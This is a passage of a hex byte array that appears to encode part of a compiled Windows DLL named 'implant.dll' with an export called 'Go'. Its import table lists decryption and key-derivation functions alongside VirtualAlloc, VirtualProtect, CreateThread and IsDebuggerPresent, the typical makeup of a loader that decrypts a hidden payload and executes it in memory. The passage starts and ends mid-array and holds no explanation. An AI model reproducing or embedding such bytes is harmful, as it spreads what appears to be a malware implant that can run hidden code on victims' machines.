0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x12, 0xc2, 0x0, 0x0, 0x90, 0xc2, 0x0, 0x0, 0xd5, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x17, 0xa, 0x0, 0x17, 0x54, 0xe, 0x0, 0x17, 0x34, 0xd, 0x0, 0x17, 0x52, 0x13, 0xf0, 0x11, 0xe0, 0xf, 0xd0, 0xd, 0xc0, 0xb, 0x70, 0x1, 0xe, 0x2, 0x0, 0xe, 0x32, 0xa, 0x30, 0x1, 0x18, 0x6, 0x0, 0x18, 0x54, 0x7, 0x0, 0x18, 0x34, 0x6, 0x0, 0x18, 0x32, 0x14, 0x60, 0x1, 0x9, 0x1, 0x0, 0x9, 0x42, 0x0, 0x0, 0x1, 0x10, 0x6, 0x0, 0x10, 0x64, 0x9, 0x0, 0x10, 0x34, 0x8, 0x0, 0x10, 0x52, 0xc, 0x70, 0x11, 0x10, 0x4, 0x0, 0x10, 0x34, 0x9, 0x0, 0x10, 0x52, 0xc, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xa4, 0xc9, 0x0, 0x0, 0xb1, 0xc9, 0x0, 0x0, 0xee, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0xa, 0x3, 0x0, 0xa, 0x68, 0x2, 0x0, 0x4, 0xa2, 0x0, 0x0, 0x19, 0x1e, 0x8, 0x0, 0xf, 0x72, 0xb, 0xf0, 0x9, 0xe0, 0x7, 0xc0, 0x5, 0x70, 0x4, 0x60, 0x3, 0x50, 0x2, 0x30, 0x1c, 0xdf, 0x0, 0x0, 0x30, 0x0, 0x0, 0x0, 0x1, 0x8, 0x1, 0x0, 0x8, 0xa2, 0x0, 0x0, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xf1, 0xd3, 0x0, 0x0, 0x37, 0xd4, 0x0, 0x0, 0xa4, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x0, 0x8, 0x92, 0x4, 0x30, 0x19, 0x26, 0x9, 0x0, 0x18, 0x68, 0xd, 0x0, 0x14, 0x1, 0x1c, 0x0, 0x9, 0xe0, 0x7, 0x70, 0x6, 0x60, 0x5, 0x30, 0x4, 0x50, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0xc0, 0x0, 0x0, 0x0, 0x1, 0x6, 0x2, 0x0, 0x6, 0x12, 0x2, 0x30, 0x1, 0xb, 0x3, 0x0, 0xb, 0x68, 0x5, 0x0, 0x7, 0xc2, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x2, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x82, 0x0, 0x0, 0x1, 0x1b, 0x8, 0x0, 0x1b, 0x74, 0x9, 0x0, 0x1b, 0x64, 0x8, 0x0, 0x1b, 0x34, 0x7, 0x0, 0x1b, 0x32, 0x14, 0x50, 0x9, 0xf, 0x6, 0x0, 0xf, 0x64, 0x9, 0x0, 0xf, 0x34, 0x8, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xaa, 0xdd, 0x0, 0x0, 0xb1, 0xdd, 0x0, 0x0, 0x6, 0xe9, 0x0, 0x0, 0xb1, 0xdd, 0x0, 0x0, 0x9, 0xa, 0x4, 0x0, 0xa, 0x34, 0x6, 0x0, 0xa, 0x32, 0x6, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x7d, 0xde, 0x0, 0x0, 0xb0, 0xde, 0x0, 0x0, 0x40, 0xe9, 0x0, 0x0, 0xb0, 0xde, 0x0, 0x0, 0x1, 0x2, 0x1, 0x0, 0x2, 0x30, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x1, 0x0, 0x8, 0x42, 0x0, 0x0, 0x1, 0x9, 0x1, 0x0, 0x9, 0x62, 0x0, 0x0, 0x1, 0xa, 0x4, 0x0, 0xa, 0x34, 0xd, 0x0, 0xa, 0x72, 0x6, 0x70, 0x1, 0x8, 0x4, 0x0, 0x8, 0x72, 0x4, 0x70, 0x3, 0x60, 0x2, 0x30, 0x0, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x12, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x44, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x7b, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0xe8, 0x7b, 0x1, 0x0, 0x10, 0x7c, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x9b, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x10, 0x44, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x9b, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x6c, 0x44, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x72, 0x7c, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x68, 0x7c, 0x1, 0x0, 0x6c, 0x7c, 0x1, 0x0, 0x70, 0x7c, 0x1, 0x0, 0x30, 0x11, 0x0, 0x0, 0x7e, 0x7c, 0x1, 0x0, 0x0, 0x0, 0x69, 0x6d, 0x70, 0x6c, 0x61, 0x6e, 0x74, 0x2e, 0x64, 0x6c, 0x6c, 0x0, 0x47, 0x6f, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x7c, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x80, 0x1, 0x0, 0x0, 0xf0, 0x0, 0x0, 0x8, 0x7d, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa6, 0x81, 0x1, 0x0, 0x48, 0xf0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9e, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd2, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe4, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5e, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8e, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa4, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbe, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd4, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x46, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x92, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8c, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb4, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xda, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xea, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfa, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x12, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x84, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x92, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9c, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xaa, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbc, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xce, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xde, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x26, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3a, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8a, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9e, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xae, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xca, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd6, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe2, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1c, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x32, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8e, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xba, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xca, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xea, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf6, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x14, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x34, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5c, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x41, 0x63, 0x71, 0x75, 0x69, 0x72, 0x65, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x57, 0x0, 0x0, 0xdc, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x52, 0x65, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x0, 0xc6, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x44, 0x65, 0x72, 0x69, 0x76, 0x65, 0x4b, 0x65, 0x79, 0x0, 0x0, 0xc8, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x44, 0x65, 0x73, 0x74, 0x72, 0x6f, 0x79, 0x4b, 0x65, 0x79, 0x0, 0xc5, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x44, 0x65, 0x63, 0x72, 0x79, 0x70, 0x74, 0x0, 0x0, 0xc4, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x48, 0x61, 0x73, 0x68, 0x0, 0xd9, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x48, 0x61, 0x73, 0x68, 0x44, 0x61, 0x74, 0x61, 0x0, 0xc7, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x44, 0x65, 0x73, 0x74, 0x72, 0x6f, 0x79, 0x48, 0x61, 0x73, 0x68, 0x0, 0x0, 0x41, 0x44, 0x56, 0x41, 0x50, 0x49, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x0, 0x0, 0x2, 0x6, 0x57, 0x61, 0x69, 0x74, 0x46, 0x6f, 0x72, 0x53, 0x69, 0x6e, 0x67, 0x6c, 0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x0, 0xfb, 0x0, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x0, 0x0, 0xf1, 0x5, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x0, 0xf7, 0x5, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x0, 0x0, 0x64, 0x4, 0x51, 0x75, 0x65, 0x72, 0x79, 0x50, 0x65, 0x72, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x6e, 0x63, 0x65, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x65, 0x72, 0x0, 0x2b, 0x2, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x0, 0x2f, 0x2, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x49, 0x64, 0x0, 0x0, 0x1, 0x3, 0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x54, 0x69, 0x6d, 0x65, 0x41, 0x73, 0x46, 0x69, 0x6c, 0x65, 0x54, 0x69, 0x6d, 0x65, 0x0, 0x81, 0x3, 0x49, 0x6e, 0x69, 0x74, 0x69, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x53, 0x4c, 0x69, 0x73, 0x74, 0x48, 0x65, 0x61, 0x64, 0x0, 0xe9, 0x4, 0x52, 0x74, 0x6c, 0x43, 0x61, 0x70, 0x74, 0x75, 0x72, 0x65, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x0, 0xf1, 0x4, 0x52, 0x74, 0x6c, 0x4c, 0x6f, 0x6f, 0x6b, 0x75, 0x70, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x0, 0x0, 0xf8, 0x4, 0x52, 0x74, 0x6c, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x55, 0x6e, 0x77, 0x69, 0x6e, 0x64, 0x0, 0x0, 0x97, 0x3, 0x49, 0x73, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x65, 0x72, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6e, 0x74, 0x0, 0xd8, 0x5, 0x55, 0x6e, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x46, 0x69, 0x6c, 0x74, 0x65, 0x72, 0x0, 0x0, 0x97, 0x5, 0x53, 0x65, 0x74, 0x55, 0x6e, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x46, 0x69, 0x6c, 0x74, 0x65, 0x72, 0x0, 0xe8, 0x2, 0x47, 0x65, 0x74, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x49, 0x6e, 0x66, 0x6f, 0x57, 0x0, 0x9e, 0x3, 0x49, 0x73, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x6f, 0x72, 0x46, 0x65, 0x61, 0x74, 0x75, 0x72, 0x65, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6e, 0x74, 0x0, 0x8c, 0x2, 0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x57, 0x0, 0x0, 0x4b, 0x45, 0x52, 0x4e, 0x45, 0x4c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x0, 0x0, 0xf7, 0x4, 0x52, 0x74, 0x6c, 0x55, 0x6e, 0x77, 0x69, 0x6e, 0x64, 0x45, 0x78, 0x0, 0x85, 0x3, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x6c, 0x6f, 0x63, 0x6b, 0x65, 0x64, 0x46, 0x6c, 0x75, 0x73, 0x68, 0x53, 0x4c, 0x69, 0x73, 0x74, 0x0, 0x74, 0x2, 0x47, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72, 0x0, 0x0, 0x57, 0x5, 0x53, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72, 0x0, 0x0, 0x41, 0x1, 0x45, 0x6e, 0x74, 0x65, 0x72, 0x43, 0x72, 0x69, 0x74, 0x69, 0x63, 0x61, 0x6c, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x0, 0x0, 0xd6, 0x3, 0x4c, 0x65, 0x61, 0x76, 0x65, 0x43, 0x72, 0x69, 0x74, 0x69, 0x63, 0x61, 0x6c, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x0, 0x0, 0x1b, 0x1, 0x44, 0x65, 0x6c, 0x65, 0x74, 0x65, 0x43, 0x72, 0x69, 0x74, 0x69, 0x63, 0x61, 0x6c, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x0, 0x7d, 0x3, 0x49, 0x6e, 0x69, 0x74, 0x69, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x43, 0x72, 0x69, 0x74, 0x69, 0x63, 0x61, 0x6c, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x41, 0x6e, 0x64, 0x53, 0x70, 0x69, 0x6e, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x0, 0xc8, 0x5, 0x54, 0x6c, 0x73, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x0, 0xca, 0x5, 0x54, 0x6c, 0x73, 0x47, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x0, 0xcb, 0x5, 0x54, 0x6c, 0x73, 0x53, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x0, 0xc9, 0x5, 0x54, 0x6c, 0x73, 0x46, 0x72, 0x65, 0x65, 0x0, 0xbd, 0x1, 0x46, 0x72, 0x65, 0x65, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x0, 0xc4, 0x2, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x0, 0x0, 0xdc, 0x3, 0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x45, 0x78, 0x57, 0x0, 0x0, 0x3d, 0x1, 0x45, 0x6e, 0x63, 0x6f, 0x64, 0x65, 0x50, 0x6f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x0, 0x7b, 0x4, 0x52, 0x61, 0x69, 0x73, 0x65, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x0, 0x0, 0xf3, 0x4, 0x52, 0x74, 0x6c, 0x50, 0x63, 0x54, 0x6f, 0x46, 0x69, 0x6c, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x0, 0x2a, 0x2, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x0, 0x70, 0x1, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x0, 0xb6, 0x5, 0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x0, 0x0, 0x8b, 0x2, 0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x45, 0x78, 0x57, 0x0, 0x0, 0x88, 0x2, 0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x4e, 0x61, 0x6d, 0x65, 0x57, 0x0, 0x0, 0x63, 0x3, 0x48, 0x65, 0x61, 0x70, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x67, 0x3, 0x48, 0x65, 0x61, 0x70, 0x46, 0x72, 0x65, 0x65, 0x0, 0x0, 0x87, 0x1, 0x46, 0x69, 0x6e, 0x64, 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x0, 0x8d, 0x1, 0x46, 0x69, 0x6e, 0x64, 0x46, 0x69, 0x72, 0x73, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x45, 0x78, 0x57, 0x0, 0x0, 0x9e, 0x1, 0x46, 0x69, 0x6e, 0x64, 0x4e, 0x65, 0x78, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x57, 0x0, 0xa4, 0x3, 0x49, 0x73, 0x56, 0x61, 0x6c, 0x69, 0x64, 0x43, 0x6f, 0x64, 0x65, 0x50, 0x61, 0x67, 0x65, 0x0, 0xc4, 0x1, 0x47, 0x65, 0x74, 0x41, 0x43, 0x50, 0x0, 0x0, 0xad, 0x2, 0x47, 0x65, 0x74, 0x4f, 0x45, 0x4d, 0x43, 0x50, 0x0, 0x0, 0xd3, 0x1, 0x47, 0x65, 0x74, 0x43, 0x50, 0x49, 0x6e, 0x66, 0x6f, 0x0, 0xe8, 0x1, 0x47, 0x65, 0x74, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x41, 0x0, 0xe9, 0x1, 0x47, 0x65, 0x74, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x57, 0x0, 0x8, 0x4, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x42, 0x79, 0x74, 0x65, 0x54, 0x6f, 0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72, 0x0, 0x29, 0x6, 0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72, 0x54, 0x6f, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x42, 0x79, 0x74, 0x65, 0x0, 0x4b, 0x2, 0x47, 0x65, 0x74, 0x45, 0x6e, 0x76, 0x69, 0x72, 0x6f, 0x6e, 0x6d, 0x65, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x57, 0x0, 0x0, 0xbc, 0x1, 0x46, 0x72, 0x65, 0x65, 0x45, 0x6e, 0x76, 0x69, 0x72, 0x6f, 0x6e, 0x6d, 0x65, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x57, 0x0, 0xac, 0x1, 0x46, 0x6c, 0x73, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x0, 0xae, 0x1, 0x46, 0x6c, 0x73, 0x47, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x0, 0xaf, 0x1, 0x46, 0x6c, 0x73, 0x53, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x0, 0xad, 0x1, 0x46, 0x6c, 0x73, 0x46, 0x72, 0x65, 0x65, 0x0, 0xca, 0x3, 0x4c, 0x43, 0x4d, 0x61, 0x70, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x57, 0x0, 0x0, 0xcb, 0x2, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x48, 0x65, 0x61, 0x70, 0x0, 0x0, 0xea, 0x2, 0x47, 0x65, 0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x0, 0x0, 0x62, 0x2, 0x47, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x54, 0x79, 0x70, 0x65, 0x0, 0xef, 0x2, 0x47, 0x65, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x54, 0x79, 0x70, 0x65, 0x57, 0x0, 0x0, 0x6c, 0x3, 0x48, 0x65, 0x61, 0x70, 0x53, 0x69, 0x7a, 0x65, 0x0, 0x0, 0x6a, 0x3, 0x48, 0x65, 0x61, 0x70, 0x52, 0x65, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x72, 0x5, 0x53, 0x65, 0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x0, 0x0, 0xb1, 0x1, 0x46, 0x6c, 0x75, 0x73, 0x68, 0x46, 0x69, 0x6c, 0x65, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x73, 0x0, 0x0, 0x3d, 0x6, 0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x0, 0x12, 0x2, 0x47, 0x65, 0x74, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x4f, 0x75, 0x74, 0x70, 0x75, 